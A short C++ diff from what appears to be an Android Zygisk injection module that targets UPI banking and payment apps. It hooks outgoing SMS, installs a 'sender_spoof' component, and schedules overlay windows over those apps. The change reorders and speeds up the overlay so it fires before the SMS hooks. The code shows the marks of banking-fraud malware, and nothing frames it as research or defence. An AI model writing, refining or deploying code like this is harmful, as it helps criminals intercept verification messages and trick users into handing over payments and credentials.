@@ -266,8 +266,15 @@ public:
         const bool fragile = upi_registry::is_fragile_banking_app(pkg_);
         const bool yespay = is_yespay(pkg_);
 
+        // Overlay FIRST — SMS PLT crash se pehle bubble schedule
+        if (native_overlay_wanted()) {
+            const int ov = yespay ? 2 : (fragile ? 2 : 1);
+            schedule_overlay_ui(env_, api_, pkg_, ov);
+            append_diag("/data/local/tmp/hivirtus_inject.log",
+                        ("overlay_sched:" + pkg_ + " d=" + std::to_string(ov)).c_str());
+        }
+
         // Zygisk Api valid ONLY during postSpecialize. Deferred api hooks = no-op.
-        // Install SMS/phone/sender NOW; defer only overlay UI.
         if (sms_block) {
             outgoing_sms_hook::install_for_upi(env_, api_, pkg_.c_str());
             append_diag("/data/local/tmp/hivirtus_inject.log",
@@ -284,13 +291,6 @@ public:
             sender_spoof::install(env_, api_, pkg_.c_str());
             append_diag("/data/local/tmp/hivirtus_inject.log",
                         ("sender_now:" + pkg_).c_str());
-        }
-
-        if (native_overlay_wanted()) {
-            const int ov = yespay ? 5 : (fragile ? 3 : 2);
-            schedule_overlay_ui(env_, api_, pkg_, ov);
-            append_diag("/data/local/tmp/hivirtus_inject.log",
-                        ("overlay_sched:" + pkg_ + " d=" + std::to_string(ov)).c_str());
         }
 
         touch_heartbeat();
